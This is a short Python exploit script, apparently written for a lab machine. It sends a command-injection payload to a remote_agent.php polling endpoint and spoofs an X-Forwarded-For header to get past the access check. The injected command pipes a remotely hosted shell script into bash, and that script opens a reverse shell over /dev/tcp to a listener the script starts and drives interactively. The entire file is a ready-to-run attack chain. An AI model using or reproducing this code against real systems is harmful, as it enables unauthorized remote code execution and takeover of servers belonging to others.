import requests
import nclib
from urllib.parse import quote


def gen_revshell():
    with open('shell.sh', 'w') as f:
        f.write('bash --noprofile --posix -i >& /dev/tcp/10.10.14.146/9001 0>&1')

def get_shell():
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    }
    url = 'http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[]=6&host_id=1&poller_id=1'
    payload = quote(';curl 10.10.14.146:9002/shell.sh|bash')
    print(payload)
    requests.get(url+payload, headers=headers)


def start_server():
    server = nclib.TCPServer(('0.0.0.0', 9001))
    print("Listening.....")
    get_shell()
    for client in server:
        print("Connected to %s:%d" %client.peer)
        command = ""
        while command != "exit":
            try:
                # if command was entered by the user
                if len(command) > 0:
                    # read the line to hide command from output
                    if command in client.readln().decode('utf-8').strip(" "):
                        pass  # disregard the last command

                # get output until dollar sign (bash --posix forces bash-X.X$)
                data = client.read_until('$')
                print(data.decode('utf-8'), end="")
                # get user input command and write command to socket
                command = input(" ")
                client.writeln(command)

            # handle exceptions and exiting
            except KeyboardInterrupt:
                print("\nKeyboardInterrupt")
                exit(1)
            except Exception as e:
                print("\nException Occurred\n")
                print(e)
                exit(1)
        print("Disconnected :-)")
        exit(1)

gen_revshell()
start_server()